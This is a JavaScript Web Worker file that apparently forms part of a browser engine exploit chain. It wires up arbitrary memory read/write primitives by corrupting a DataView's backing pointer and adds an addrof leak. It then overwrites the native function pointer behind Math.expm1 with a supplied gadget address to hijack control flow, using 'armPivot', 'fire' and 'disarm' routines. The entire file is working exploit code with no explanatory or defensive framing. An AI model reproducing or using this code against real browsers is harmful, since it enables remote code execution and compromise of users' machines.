"use strict";

let marker_arr = new Uint32Array(new ArrayBuffer(0x10));

const transfer = [];

let leakObj = null;
let master = null;
let victim = null;

let leakLo = 0, leakHi = 0;
let wired = false;

let pivotObj = null;
let execLo = 0, execHi = 0;
let origLo = 0, origHi = 0;
let armed = false;

const VECTOR_OFF = 0x10;
const INLINE_OFF = 0x10;
const M_FUNCTION = 0x28;
const EXECUTABLE = 0x18;

function view(lo, hi) {
    if (!wired) throw new Error("worker arw is not wired yet");
    master[VECTOR_OFF / 4] = lo >>> 0;
    master[VECTOR_OFF / 4 + 1] = hi >>> 0;
    return victim;
}

function at(a, n) {
    const l = (a[0] >>> 0) + n;
    return l > 0xffffffff
        ? [(l - 0x100000000) >>> 0, (a[1] + 1) >>> 0]
        : [l >>> 0, a[1] >>> 0];
}
function rd8(lo, hi) {
    const dv = view(lo, hi);
    return [dv.getUint32(0, true), dv.getUint32(4, true)];
}
function wr8(lo, hi, vlo, vhi) {
    const dv = view(lo, hi);
    dv.setUint32(0, vlo >>> 0, true);
    dv.setUint32(4, vhi >>> 0, true);
}
function addrofRaw(obj) {
    leakObj.obj = obj;
    const dv = view(leakLo, leakHi);
    const a = [dv.getUint32(INLINE_OFF, true), dv.getUint32(INLINE_OFF + 4, true)];
    leakObj.obj = null;
    return a;
}

const api = {
    ping() {
        return "pong";
    },

    init(sentLo, sentHi) {
        leakObj = { obj: null };
        master = new Uint32Array(6);
        victim = new DataView(new ArrayBuffer(0x30));

        marker_arr[0] = sentLo >>> 0;
        marker_arr[1] = sentHi >>> 0;
        marker_arr[2] = 0x5a5a5a5a;
        marker_arr[3] = 0xa5a5a5a5;

        marker_arr.leak = leakObj;
        marker_arr.master = master;
        marker_arr.victim = victim;

        transfer.push(marker_arr.buffer);
        return marker_arr;
    },

    setup(lo, hi) {
        pivotObj = {};
        leakLo = lo >>> 0;
        leakHi = hi >>> 0;
        wired = true;

        const dv = view(leakLo, leakHi);
        const h0 = dv.getUint32(0, true), h1 = dv.getUint32(4, true);
        if (h0 === 0 && h1 === 0) {
            wired = false;
            throw new Error("leak cell header reads zero -- the wire did not take");
        }
        return [h0, h1];
    },

    readU32(lo, hi, count) {
        if (count < 1 || count * 4 > 0x30) throw new Error("count out of range");
        const dv = view(lo, hi);
        const out = [];
        for (let i = 0; i < count; ++i) out.push(dv.getUint32(i * 4, true));
        return out;
    },

    writeU32(lo, hi, values) {
        if (values.length * 4 > 0x30) throw new Error("too many values");
        const dv = view(lo, hi);
        for (let i = 0; i < values.length; ++i)
            dv.setUint32(i * 4, values[i] >>> 0, true);
        return values.length;
    },

    addrof(which) {
        return addrofRaw(which === "master" ? master
            : which === "victim" ? victim
            : which === "leak" ? leakObj
            : which === "pivot" ? pivotObj
            : which === "expm1" ? Math.expm1
            : marker_arr);
    },

    armPivot(g0lo, g0hi) {
        if (armed) throw new Error("already armed");
        const fn = addrofRaw(Math.expm1);
        const exAt = at(fn, EXECUTABLE);
        const ex = rd8(exAt[0], exAt[1]);
        if (ex[0] === 0 && ex[1] === 0)
            throw new Error("expm1 executable pointer reads zero");
        execLo = ex[0]; execHi = ex[1];

        const mf = at([execLo, execHi], M_FUNCTION);
        const orig = rd8(mf[0], mf[1]);
        if (orig[0] === 0 && orig[1] === 0)
            throw new Error("expm1 m_function reads zero");
        origLo = orig[0]; origHi = orig[1];

        wr8(mf[0], mf[1], g0lo, g0hi);
        const back = rd8(mf[0], mf[1]);
        if ((back[0] >>> 0) !== (g0lo >>> 0) || (back[1] >>> 0) !== (g0hi >>> 0)) {
            wr8(mf[0], mf[1], origLo, origHi);
            throw new Error("m_function did not take the write");
        }
        armed = true;
        return { exec: [execLo, execHi], orig: [origLo, origHi] };
    },

    fire(sLo, sHi) {
        if (!armed) throw new Error("pivot is not armed");
        const pa = addrofRaw(pivotObj);
        const saved = rd8(pa[0], pa[1]);
        wr8(pa[0], pa[1], sLo, sHi);
        Math.expm1(pivotObj);
        wr8(pa[0], pa[1], saved[0], saved[1]);
        return true;
    },

    disarm() {
        if (!armed) return { restored: false, expm1: null };
        const mf = at([execLo, execHi], M_FUNCTION);
        wr8(mf[0], mf[1], origLo, origHi);
        const back = rd8(mf[0], mf[1]);
        armed = false;
        const ok = (back[0] >>> 0) === (origLo >>> 0)
                && (back[1] >>> 0) === (origHi >>> 0);
        return { restored: ok, mFunction: back, expm1: Math.expm1(1) };
    },

    release() {
        marker_arr = null;
        return true;
    },
};

self.onmessage = function (e) {
    const d = e.data || {};
    const id = d.id, name = d.name, args = d.args || [];
    let out;
    try {
        const fn = api[name];
        if (typeof fn !== "function") throw new Error("unknown function " + name);
        out = { id: id, type: "ret", value: fn.apply(api, args) };
    } catch (err) {
        out = { id: id, type: "err", value: (err && err.message) ? err.message : String(err) };
    }
    if (transfer.length) {
        self.postMessage(out, transfer);
        transfer.length = 0;
    } else {
        self.postMessage(out);
    }
};
